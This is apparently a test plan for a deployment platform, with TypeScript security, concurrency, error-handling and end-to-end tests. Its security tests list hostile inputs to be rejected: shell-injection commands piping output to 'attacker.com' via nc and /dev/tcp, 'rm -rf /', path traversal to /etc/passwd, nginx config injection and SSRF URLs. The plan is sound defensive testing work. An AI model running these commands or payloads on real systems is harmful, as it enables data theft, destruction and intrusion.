# Cloudify Test Plan - Bug-Finding Focus

This test plan is designed to **find real bugs**, not just verify happy paths. Each section targets specific weaknesses in the current test suite.

---

## Executive Summary

**Current State:** 277 test files, 3,447 lines of test code, but tests are too shallow and mock-heavy to catch real bugs.

**Key Problems:**
1. Mocks hide real validation/security issues
2. Only happy paths tested
3. No concurrency/race condition tests
4. Critical security scenarios missing
5. Error handling not exercised

---

## Priority 1: CRITICAL Security Tests (Must Have)

### 1.1 Shell Injection in Build Commands

**File:** `lib/build/executor.ts:43`
**Bug:** `shell: true` with user-controlled `buildCmd`

```typescript
// test/security/build-injection.test.ts
describe('Build Command Security', () => {
  it('should reject commands with shell metacharacters', async () => {
    const maliciousCommands = [
      'echo test && cat /etc/passwd',
      'npm run build; rm -rf /',
      '$(whoami)',
      '`id`',
      'npm run build | nc attacker.com 1234',
      'npm run build > /dev/tcp/attacker.com/1234',
    ];

    for (const cmd of maliciousCommands) {
      await expect(executor.runCommand(cmd)).rejects.toThrow(/invalid command/i);
    }
  });

  it('should not leak environment variables to build process', async () => {
    process.env.DATABASE_URL = 'postgres://secret';
    process.env.JWT_SECRET = 'super-secret';

    const result = await executor.runCommand('printenv');
    expect(result.stdout).not.toContain('DATABASE_URL');
    expect(result.stdout).not.toContain('JWT_SECRET');
  });
});
```

### 1.2 Directory Traversal in Build Output

**File:** `lib/build/executor.ts:189`
**Bug:** `outputDir` not validated

```typescript
describe('Output Directory Security', () => {
  it('should reject path traversal in outputDir', async () => {
    const maliciousPaths = [
      '../../../etc/passwd',
      '/etc/passwd',
      '..\\..\\windows\\system32',
      'dist/../../..',
      'dist/../../../etc',
    ];

    for (const outputDir of maliciousPaths) {
      await expect(
        executor.copyOutput({ outputDir, workDir: '/tmp/build' })
      ).rejects.toThrow(/path traversal/i);
    }
  });

  it('should resolve symlinks and reject if outside workDir', async () => {
    // Create symlink pointing outside workDir
    await fs.symlink('/etc/passwd', '/tmp/build/dist/evil');

    await expect(
      executor.copyOutput({ outputDir: 'dist', workDir: '/tmp/build' })
    ).rejects.toThrow(/symlink/i);
  });
});
```

### 1.3 Cross-User Data Access (IDOR)

**File:** `app/api/storage/blobs/route.ts:108`
**Bug:** No ownership verification for storeId

```typescript
// test/security/authorization.test.ts
describe('Cross-User Authorization', () => {
  let userA: User, userB: User;
  let projectA: Project, projectB: Project;

  beforeEach(async () => {
    userA = await createUser({ email: 'a@test.com' });
    userB = await createUser({ email: 'b@test.com' });
    projectA = await createProject({ userId: userA.id });
    projectB = await createProject({ userId: userB.id });
  });

  it('should NOT allow userA to access userB blob store', async () => {
    const storeB = await createBlobStore({ projectId: projectB.id });

    const response = await fetch(`/api/storage/blobs?storeId=${storeB.id}`, {
      headers: { Cookie: `session=${userA.sessionToken}` },
    });

    expect(response.status).toBe(403);
  });

  it('should NOT allow userA to access userB project', async () => {
    const response = await fetch(`/api/projects/${projectB.id}`, {
      headers: { Cookie: `session=${userA.sessionToken}` },
    });

    expect(response.status).toBe(403);
  });

  it('should NOT allow userA to deploy to userB project', async () => {
    const response = await fetch(`/api/projects/${projectB.id}/deployments`, {
      method: 'POST',
      headers: { Cookie: `session=${userA.sessionToken}` },
      body: JSON.stringify({ branch: 'main' }),
    });

    expect(response.status).toBe(403);
  });

  it('should NOT allow access via cursor from another user', async () => {
    const deployment = await createDeployment({ projectId: projectB.id });

    const response = await fetch(
      `/api/projects/${projectA.id}/deployments?cursor=${deployment.id}`,
      { headers: { Cookie: `session=${userA.sessionToken}` } }
    );

    // Should either 403 or return empty (not leak deployment data)
    const data = await response.json();
    expect(data.deployments.some(d => d.projectId === projectB.id)).toBe(false);
  });
});
```

### 1.4 Nginx Configuration Injection

**File:** `lib/domains/nginx.ts:24`
**Bug:** Domain not escaped

```typescript
describe('Nginx Security', () => {
  it('should escape domain names in nginx config', () => {
    const maliciousDomains = [
      'example.com; return 403;',
      'example.com\nserver { listen 80; }',
      'example.com"; return 403; #',
      '${hostname}',
      '$(whoami).attacker.com',
    ];

    for (const domain of maliciousDomains) {
      expect(() => nginx.generateConfig({ domain })).toThrow(/invalid domain/i);
    }
  });

  it('should only allow valid domain format', () => {
    const validDomains = ['example.com', 'sub.example.com', 'my-app.example.co.uk'];
    const invalidDomains = ['not a domain', 'http://example.com', 'example.com/path'];

    for (const domain of validDomains) {
      expect(() => nginx.generateConfig({ domain })).not.toThrow();
    }
    for (const domain of invalidDomains) {
      expect(() => nginx.generateConfig({ domain })).toThrow();
    }
  });
});
```

### 1.5 SSRF via Webhook URL

**File:** `app/api/integrations/route.ts:121`
**Bug:** webhookUrl not validated

```typescript
describe('Webhook URL Validation', () => {
  it('should reject internal network URLs', async () => {
    const ssrfUrls = [
      'http://localhost/admin',
      'http://127.0.0.1:8080/internal',
      'http://192.168.1.1/admin',
      'http://10.0.0.1/internal',
      'http://169.254.169.254/latest/meta-data/', // AWS metadata
      'http://[::1]/admin',
      'file:///etc/passwd',
      'gopher://internal:25/',
    ];

    for (const webhookUrl of ssrfUrls) {
      const response = await fetch('/api/integrations', {
        method: 'POST',
        body: JSON.stringify({ type: 'slack', webhookUrl }),
      });

      expect(response.status).toBe(400);
      expect(await response.json()).toHaveProperty('error', expect.stringMatching(/invalid.*url/i));
    }
  });
});
```

### 1.6 Credentials Storage

**File:** `app/api/integrations/route.ts:118`
**Bug:** Credentials stored as plaintext

```typescript
describe('Credential Security', () => {
  it('should encrypt credentials before storage', async () => {
    await fetch('/api/integrations', {
      method: 'POST',
      body: JSON.stringify({
        type: 'github',
        credentials: { accessToken: 'ghp_secret123' },
      }),
    });

    // Query database directly
    const integration = await prisma.integration.findFirst();

    // Credentials should be encrypted, not contain the original token
    expect(integration.credentials).not.toContain('ghp_secret123');
    expect(integration.credentials).toMatch(/^encrypted:/); // or whatever format
  });

  it('should not return credentials in API responses', async () => {
    const response = await fetch('/api/integrations');
    const data = await response.json();

    for (const integration of data.integrations) {
      expect(integration).not.toHaveProperty('credentials');
    }
  });
});
```

---

## Priority 2: Race Conditions & Concurrency

### 2.1 Concurrent Signup Race Condition

**File:** `app/api/auth/route.ts:37-50`
**Bug:** Check-then-create race condition

```typescript
// test/concurrency/auth-race.test.ts
describe('Concurrent Signup', () => {
  it('should only allow one account per email with concurrent requests', async () => {
    const email = `race-test-${Date.now()}@example.com`;

    // Fire 10 concurrent signup requests
    const requests = Array(10).fill(null).map(() =>
      fetch('/api/auth', {
        method: 'POST',
        body: JSON.stringify({
          action: 'signup',
          email,
          password: 'Password123!',
          name: 'Test User',
        }),
      })
    );

    const responses = await Promise.all(requests);
    const successes = responses.filter(r => r.status === 200 || r.status === 201);

    // Only ONE should succeed
    expect(successes.length).toBe(1);

    // Verify only one user in database
    const users = await prisma.user.findMany({ where: { email } });
    expect(users.length).toBe(1);
  });
});
```

### 2.2 Concurrent Deployment Creation

```typescript
describe('Concurrent Deployments', () => {
  it('should handle concurrent deployment triggers', async () => {
    const project = await createProject();

    // 5 concurrent deployment requests
    const requests = Array(5).fill(null).map(() =>
      fetch(`/api/projects/${project.id}/deployments`, {
        method: 'POST',
        body: JSON.stringify({ branch: 'main' }),
      })
    );

    const responses = await Promise.all(requests);

    // All should succeed (different deployments)
    const allSuccess = responses.every(r => r.status === 201);
    expect(allSuccess).toBe(true);

    // Each should have unique ID
    const ids = await Promise.all(responses.map(r => r.json().then(d => d.id)));
    const uniqueIds = new Set(ids);
    expect(uniqueIds.size).toBe(5);
  });

  it('should not allow concurrent cancellation of same deployment', async () => {
    const deployment = await createDeployment({ status: 'BUILDING' });

    const requests = Array(3).fill(null).map(() =>
      fetch(`/api/deployments/${deployment.id}/cancel`, { method: 'POST' })
    );

    const responses = await Promise.all(requests);
    const successes = responses.filter(r => r.status === 200);

    // Only one should succeed
    expect(successes.length).toBe(1);
  });
});
```

### 2.3 Session Race Conditions

```typescript
describe('Session Concurrency', () => {
  it('should handle concurrent requests with same session', async () => {
    const session = await createSession();

    // 20 concurrent API requests
    const requests = Array(20).fill(null).map(() =>
      fetch('/api/projects', {
        headers: { Cookie: `session=${session.token}` },
      })
    );

    const responses = await Promise.all(requests);

    // All should return same user data
    const data = await Promise.all(responses.map(r => r.json()));
    const uniqueUserIds = new Set(data.map(d => d.userId));
    expect(uniqueUserIds.size).toBe(1);
  });

  it('should handle session expiry during request', async () => {
    const session = await createSession({ expiresAt: new Date(Date.now() + 100) });

    // Start long request
    const longRequest = fetch('/api/projects/expensive-operation', {
      headers: { Cookie: `session=${session.token}` },
    });

    // Wait for session to expire
    await new Promise(r => setTimeout(r, 150));

    // Session expired mid-request - should handle gracefully
    const response = await longRequest;
    // Either complete with original session or return auth error
    expect([200, 401]).toContain(response.status);
  });
});
```

---

## Priority 3: Error Handling & Edge Cases

### 3.1 Database Failures

```typescript
// test/error-handling/database.test.ts
describe('Database Error Handling', () => {
  it('should handle database connection timeout', async () => {
    // Simulate connection timeout
    vi.spyOn(prisma, '$connect').mockRejectedValueOnce(
      new Error('Connection timeout')
    );

    const response = await fetch('/api/projects');

    expect(response.status).toBe(503);
    expect(await response.json()).toHaveProperty('error', expect.stringMatching(/service.*unavailable/i));
  });

  it('should handle transaction failure mid-operation', async () => {
    const originalCreate = prisma.project.create;
    let callCount = 0;

    prisma.project.create = vi.fn().mockImplementation(async (...args) => {
      callCount++;
      if (callCount === 1) {
        return originalCreate.call(prisma.project, ...args);
      }
      throw new Error('Transaction failed');
    });

    const response = await fetch('/api/projects', {
      method: 'POST',
      body: JSON.stringify({ name: 'Test Project' }),
    });

    // Should rollback and return error
    expect(response.status).toBe(500);

    // Verify nothing was created (rolled back)
    const projects = await prisma.project.findMany();
    expect(projects).toHaveLength(0);
  });

  it('should handle unique constraint violation gracefully', async () => {
    await createProject({ slug: 'my-project' });

    // Try to create with same slug
    const response = await fetch('/api/projects', {
      method: 'POST',
      body: JSON.stringify({ name: 'My Project' }), // generates same slug
    });

    expect(response.status).toBe(409);
    expect(await response.json()).toHaveProperty('error', expect.stringMatching(/already exists/i));
  });
});
```

### 3.2 Invalid/Malformed Input

```typescript
describe('Input Validation', () => {
  it('should reject malformed JSON', async () => {
    const response = await fetch('/api/projects', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: '{ invalid json',
    });

    expect(response.status).toBe(400);
  });

  it('should reject oversized payloads', async () => {
    const hugePayload = { name: 'x'.repeat(10 * 1024 * 1024) }; // 10MB

    const response = await fetch('/api/projects', {
      method: 'POST',
      body: JSON.stringify(hugePayload),
    });

    expect(response.status).toBe(413);
  });

  it('should handle null bytes in strings', async () => {
    const response = await fetch('/api/projects', {
      method: 'POST',
      body: JSON.stringify({ name: 'test\x00project' }),
    });

    expect(response.status).toBe(400);
  });

  it('should handle unicode edge cases', async () => {
    const unicodeNames = [
      'café',           // Composed
      'cafe\u0301',     // Decomposed (e + combining acute)
      '👨‍👩‍👧‍👦',           // ZWJ sequence
      '\u202Ereversed', // RTL override
    ];

    for (const name of unicodeNames) {
      const response = await fetch('/api/projects', {
        method: 'POST',
        body: JSON.stringify({ name }),
      });

      // Should either accept with normalization or reject consistently
      if (response.status === 201) {
        const project = await response.json();
        // Verify normalized
        expect(project.name).toBe(name.normalize('NFC'));
      }
    }
  });

  it('should reject project names that generate empty slugs', async () => {
    const badNames = ['!!!', '   ', '...', '---'];

    for (const name of badNames) {
      const response = await fetch('/api/projects', {
        method: 'POST',
        body: JSON.stringify({ name }),
      });

      expect(response.status).toBe(400);
    }
  });
});
```

### 3.3 Pagination Edge Cases

```typescript
describe('Pagination', () => {
  it('should handle non-existent cursor', async () => {
    const response = await fetch('/api/projects?cursor=nonexistent-id');

    // Should return 400 or empty array, NOT crash
    expect([200, 400]).toContain(response.status);
  });

  it('should handle negative limit', async () => {
    const response = await fetch('/api/projects?limit=-5');

    expect(response.status).toBe(400);
  });

  it('should handle limit=0', async () => {
    const response = await fetch('/api/projects?limit=0');

    expect(response.status).toBe(400);
  });

  it('should cap excessively large limits', async () => {
    const response = await fetch('/api/projects?limit=999999');

    expect(response.status).toBe(200);
    const data = await response.json();
    // Should be capped to reasonable max (e.g., 100)
    expect(data.projects.length).toBeLessThanOrEqual(100);
  });

  it('should return correct hasMore at exact boundary', async () => {
    // Create exactly 11 projects
    await Promise.all(Array(11).fill(null).map((_, i) =>
      createProject({ name: `Project ${i}` })
    ));

    const response = await fetch('/api/projects?limit=10');
    const data = await response.json();

    expect(data.projects.length).toBe(10);
    expect(data.hasMore).toBe(true);

    // Fetch next page
    const response2 = await fetch(`/api/projects?limit=10&cursor=${data.nextCursor}`);
    const data2 = await response2.json();

    expect(data2.projects.length).toBe(1);
    expect(data2.hasMore).toBe(false);
  });
});
```

### 3.4 Session/Cookie Edge Cases

```typescript
describe('Session Edge Cases', () => {
  it('should handle malformed cookie header', async () => {
    const malformedCookies = [
      'cloudify_session',           // No value
      'cloudify_session=',          // Empty value
      '; cloudify_session=token',   // Leading semicolon
      'cloudify_session===token',   // Multiple equals
      'cloudify_session=%00%00',    // Null bytes
    ];

    for (const cookie of malformedCookies) {
      const response = await fetch('/api/projects', {
        headers: { Cookie: cookie },
      });

      // Should return 401, NOT crash
      expect(response.status).toBe(401);
    }
  });

  it('should reject expired sessions', async () => {
    const session = await createSession({
      expiresAt: new Date(Date.now() - 1000), // Expired
    });

    const response = await fetch('/api/projects', {
      headers: { Cookie: `session=${session.token}` },
    });

    expect(response.status).toBe(401);
  });

  it('should handle session deleted during request', async () => {
    const session = await createSession();

    // Delete session while making request
    const requestPromise = fetch('/api/projects', {
      headers: { Cookie: `session=${session.token}` },
    });

    await prisma.session.delete({ where: { id: session.id } });

    const response = await requestPromise;
    expect(response.status).toBe(401);
  });
});
```

---

## Priority 4: Integration Tests (Real Database)

### 4.1 Real API Tests (Not Mocked)

```typescript
// test/integration/real-api/auth.test.ts
import { beforeAll, afterAll, describe, it, expect } from 'vitest';
import { execSync } from 'child_process';

describe('Auth API - Real Database', () => {
  beforeAll(async () => {
    // Use test database
    process.env.DATABASE_URL = process.env.TEST_DATABASE_URL;
    execSync('npx prisma db push --force-reset');
  });

  it('should complete full signup → login → access flow', async () => {
    // 1. Signup
    const signupResponse = await fetch('http://localhost:3000/api/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        action: 'signup',
        email: 'real-test@example.com',
        password: 'SecureP@ss123!',
        name: 'Real Test',
      }),
    });

    expect(signupResponse.status).toBe(201);
    const signupData = await signupResponse.json();
    const sessionCookie = signupResponse.headers.get('set-cookie');
    expect(sessionCookie).toContain('cloudify_session=');

    // 2. Access protected endpoint
    const projectsResponse = await fetch('http://localhost:3000/api/projects', {
      headers: { Cookie: sessionCookie! },
    });

    expect(projectsResponse.status).toBe(200);

    // 3. Logout
    const logoutResponse = await fetch('http://localhost:3000/api/auth', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Cookie: sessionCookie!,
      },
      body: JSON.stringify({ action: 'logout' }),
    });

    expect(logoutResponse.status).toBe(200);

    // 4. Verify session invalidated
    const afterLogout = await fetch('http://localhost:3000/api/projects', {
      headers: { Cookie: sessionCookie! },
    });

    expect(afterLogout.status).toBe(401);
  });

  it('should verify password is actually hashed in database', async () => {
    const email = `hash-test-${Date.now()}@example.com`;
    const password = 'TestPassword123!';

    await fetch('http://localhost:3000/api/auth', {
      method: 'POST',
      body: JSON.stringify({
        action: 'signup',
        email,
        password,
        name: 'Hash Test',
      }),
    });

    // Query database directly
    const user = await prisma.user.findUnique({ where: { email } });

    // Password should be hashed, not plaintext
    expect(user!.passwordHash).not.toBe(password);
    expect(user!.passwordHash).toMatch(/^\$2[aby]\$\d+\$/); // bcrypt format
  });
});
```

### 4.2 Build Pipeline Integration

```typescript
describe('Build Pipeline - Real Execution', () => {
  it('should complete full build cycle', async () => {
    // Create real project with test repo
    const project = await createProject({
      repoUrl: 'https://github.com/cloudify-test/simple-static-site.git',
      buildCmd: 'npm run build',
      outputDir: 'dist',
    });

    // Trigger deployment
    const response = await fetch(`/api/projects/${project.id}/deployments`, {
      method: 'POST',
      body: JSON.stringify({ branch: 'main' }),
    });

    const deployment = await response.json();

    // Poll for completion (max 2 minutes)
    const startTime = Date.now();
    let status = 'QUEUED';

    while (status !== 'READY' && status !== 'FAILED' && Date.now() - startTime < 120000) {
      await new Promise(r => setTimeout(r, 2000));

      const statusResponse = await fetch(`/api/deployments/${deployment.id}`);
      const data = await statusResponse.json();
      status = data.status;
    }

    expect(status).toBe('READY');

    // Verify site is accessible
    const siteResponse = await fetch(`https://${deployment.siteSlug}.cloudify.app`);
    expect(siteResponse.status).toBe(200);
  }, 150000); // 2.5 minute timeout
});
```

---

## Priority 5: E2E Scenarios That Find Bugs

### 5.1 Multi-Step User Journeys with Failure Injection

```typescript
// e2e/failure-scenarios/deployment-failures.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Deployment Failure Scenarios', () => {
  test('should handle build failure gracefully', async ({ page }) => {
    // Login
    await page.goto('/login');
    await page.fill('[name=email]', 'test@example.com');
    await page.fill('[name=password]', 'password123');
    await page.click('button[type=submit]');

    // Create project with intentionally broken build
    await page.goto('/dashboard/projects/new');
    await page.fill('[name=name]', 'Broken Build Test');
    await page.fill('[name=repoUrl]', 'https://github.com/test/repo-with-broken-build');
    await page.fill('[name=buildCmd]', 'npm run nonexistent-script');
    await page.click('button[type=submit]');

    // Trigger deployment
    await page.click('button:has-text("Deploy")');

    // Wait for failure
    await expect(page.locator('[data-status="FAILED"]')).toBeVisible({ timeout: 60000 });

    // Verify error message is shown
    await expect(page.locator('.error-message')).toContainText(/build failed/i);

    // Verify logs show actual error
    await page.click('button:has-text("View Logs")');
    await expect(page.locator('.build-logs')).toContainText(/npm ERR!/);
  });

  test('should recover from network interruption during deploy', async ({ page, context }) => {
    await page.goto('/dashboard/projects/my-project');
    await page.click('button:has-text("Deploy")');

    // Wait for deployment to start
    await expect(page.locator('[data-status="BUILDING"]')).toBeVisible();

    // Simulate network failure
    await context.setOffline(true);

    // UI should show connection lost
    await expect(page.locator('.connection-status')).toContainText(/offline/i);

    // Restore network
    await context.setOffline(false);

    // Should automatically reconnect and show current status
    await expect(page.locator('.connection-status')).toContainText(/connected/i);
  });
});
```

### 5.2 Authentication Edge Cases E2E

```typescript
test.describe('Authentication Security E2E', () => {
  test('should not allow session fixation', async ({ page, context }) => {
    // Get initial session cookie
    await page.goto('/login');
    const cookiesBefore = await context.cookies();
    const sessionBefore = cookiesBefore.find(c => c.name === 'cloudify_session');

    // Login
    await page.fill('[name=email]', 'test@example.com');
    await page.fill('[name=password]', 'password123');
    await page.click('button[type=submit]');

    // Session should be rotated after login
    const cookiesAfter = await context.cookies();
    const sessionAfter = cookiesAfter.find(c => c.name === 'cloudify_session');

    expect(sessionAfter?.value).not.toBe(sessionBefore?.value);
  });

  test('should logout from all devices', async ({ browser }) => {
    // Create two browser contexts (simulating two devices)
    const context1 = await browser.newContext();
    const context2 = await browser.newContext();

    const page1 = await context1.newPage();
    const page2 = await context2.newPage();

    // Login on both
    for (const page of [page1, page2]) {
      await page.goto('/login');
      await page.fill('[name=email]', 'test@example.com');
      await page.fill('[name=password]', 'password123');
      await page.click('button[type=submit]');
      await page.waitForURL('/dashboard');
    }

    // Logout from device 1
    await page1.click('button:has-text("Logout")');

    // Device 2 should be logged out on next navigation
    await page2.goto('/dashboard');
    await expect(page2).toHaveURL('/login');
  });

  test('should enforce rate limiting on login', async ({ page }) => {
    await page.goto('/login');

    // Attempt 10 failed logins
    for (let i = 0; i < 10; i++) {
      await page.fill('[name=email]', 'test@example.com');
      await page.fill('[name=password]', 'wrongpassword');
      await page.click('button[type=submit]');
    }

    // Should show rate limit message
    await expect(page.locator('.error-message')).toContainText(/too many attempts/i);

    // Further attempts should be blocked
    await page.fill('[name=password]', 'correctpassword');
    await page.click('button[type=submit]');
    await expect(page.locator('.error-message')).toContainText(/locked|wait/i);
  });
});
```

---

## Priority 6: Performance & Load Tests

### 6.1 API Load Testing

```typescript
// test/load/api-stress.test.ts
import { describe, it, expect } from 'vitest';

describe('API Load Tests', () => {
  it('should handle 100 concurrent requests', async () => {
    const requests = Array(100).fill(null).map(() =>
      fetch('/api/projects', {
        headers: { Cookie: `session=${testSession}` },
      })
    );

    const startTime = Date.now();
    const responses = await Promise.all(requests);
    const duration = Date.now() - startTime;

    // All should succeed
    const successes = responses.filter(r => r.status === 200);
    expect(successes.length).toBe(100);

    // Should complete in reasonable time (< 10s)
    expect(duration).toBeLessThan(10000);
  });

  it('should not leak memory under sustained load', async () => {
    const initialMemory = process.memoryUsage().heapUsed;

    // 1000 requests over 30 seconds
    for (let i = 0; i < 1000; i++) {
      await fetch('/api/projects');
      if (i % 100 === 0) {
        global.gc?.(); // Force GC if available
      }
    }

    const finalMemory = process.memoryUsage().heapUsed;
    const memoryGrowth = (finalMemory - initialMemory) / 1024 / 1024; // MB

    // Memory growth should be minimal (< 50MB)
    expect(memoryGrowth).toBeLessThan(50);
  });
});
```

---

## Test Infrastructure Improvements

### Required Changes

1. **Add test database configuration:**
```env
# .env.test
DATABASE_URL="postgresql://localhost:5432/cloudify_test"
```

2. **Add real integration test script:**
```json
// package.json
{
  "scripts": {
    "test:integration:real": "DATABASE_URL=$TEST_DATABASE_URL vitest run test/integration/real-api",
    "test:security": "vitest run test/security",
    "test:load": "vitest run test/load",
    "test:all": "npm run test:run && npm run test:integration:real && npm run test:security"
  }
}
```

3. **Reduce mock coverage in existing tests:**
   - Replace MSW handlers with real HTTP calls where possible
   - Only mock external services (GitHub API, etc.)
   - Use real Prisma with test database

4. **Add test utilities:**
```typescript
// test/utils/real-db.ts
export async function withRealDatabase<T>(fn: () => Promise<T>): Promise<T> {
  await prisma.$executeRaw`BEGIN`;
  try {
    const result = await fn();
    return result;
  } finally {
    await prisma.$executeRaw`ROLLBACK`;
  }
}
```

---

## Test Coverage Goals

| Category | Current | Target |
|----------|---------|--------|
| Line Coverage | Unknown | 80% |
| Branch Coverage | Unknown | 75% |
| Security Tests | 0 | 50+ |
| Error Path Tests | ~10% | 60% |
| Concurrency Tests | 0 | 20+ |
| Real DB Integration | 0 | 40+ |

---

## Implementation Priority

### Week 1: Critical Security
- [ ] Shell injection tests (1.1)
- [ ] Directory traversal tests (1.2)
- [ ] IDOR tests (1.3)
- [ ] SSRF tests (1.5)

### Week 2: Race Conditions
- [ ] Concurrent signup (2.1)
- [ ] Concurrent deployments (2.2)
- [ ] Session race conditions (2.3)

### Week 3: Error Handling
- [ ] Database failure tests (3.1)
- [ ] Input validation (3.2)
- [ ] Pagination edge cases (3.3)

### Week 4: Integration
- [ ] Real database auth flow (4.1)
- [ ] Build pipeline integration (4.2)
- [ ] E2E failure scenarios (5.1, 5.2)

---

## Summary

This test plan focuses on **finding bugs that matter**:

1. **Security vulnerabilities** that could expose user data or allow system compromise
2. **Race conditions** that cause data corruption or inconsistent state
3. **Edge cases** where input validation fails
4. **Error handling** where the app crashes instead of recovering gracefully
5. **Real integrations** instead of mocked happy paths

Each test is designed to **break the app** in ways that reveal actual bugs, not just verify that mocks work correctly.
